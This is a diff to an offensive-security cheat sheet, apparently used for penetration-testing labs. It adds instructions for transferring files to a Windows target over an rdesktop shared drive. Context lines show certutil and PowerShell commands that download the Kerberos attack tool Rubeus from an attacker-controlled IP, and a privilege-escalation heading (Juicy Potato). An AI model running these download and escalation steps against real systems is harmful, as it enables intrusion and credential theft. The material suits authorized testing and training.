@@ -28,6 +28,18 @@ powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http:
 certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
 ```
 
+**[+] Transfer files using rdesktop tool (Available in Kali Linux)**
+
+```
+- In Kali linux
+mkdir /home/hitman/shared
+rdesktop -f 192.168.50.48 -r disk:linux=/home/hitman/shared
+- Now in Windows's RDP
+Go to Network Places -> Entire Network -> Microsoft Terminal Services -> tsclient
+and put your files there, you will find them in Kali too
+Note: You can access the share \\tsclient directly too
+```
+
 ## < Privilege escalation >
 
 **[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**
